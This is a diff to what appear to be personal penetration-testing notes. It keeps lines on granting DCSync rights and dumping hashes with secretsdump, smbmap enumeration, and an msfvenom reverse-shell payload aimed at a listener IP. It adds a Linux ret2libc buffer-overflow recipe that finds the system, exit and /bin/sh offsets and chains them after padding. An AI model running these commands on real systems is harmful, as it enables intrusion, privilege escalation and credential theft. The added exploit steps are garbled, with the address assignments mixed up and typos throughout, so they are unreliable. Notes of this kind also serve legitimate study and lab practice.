@@ -196,7 +196,7 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
 ``` 
 - run *secretsdump* (impackt) with new user to retrieve hashes
 
-### SMB
+### sm
 - SMBMAP
   - smbmap -H $target = Check Privileges 
   - smbmap -H $target -R --depth 5
@@ -457,6 +457,30 @@ while bad_chars
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
+```
+
+- In linux
+```
+# All steps above to find EIO
+
+# Find dependencies
+ldd file
+
+# Ofsset of functions
+readelf -s /dependencies | grep " system@"
+readelf -s /dependencies | grep " exit@"
+
+# extract strings from libc with hex offsetet
+strings -a -t x /lib/dependency  | grep /bin/sh (find where bash is executed)
+-a print all
+-t x = hexadecimal
+
+# Calculate address 
+system = p dependency + @system
+exit   = p dependency + shell | /bin/bash
+shell  = p dependency + @exit
+
+executable  "A" * offset + system + exit + shell
 ```
 
 ## Convert python
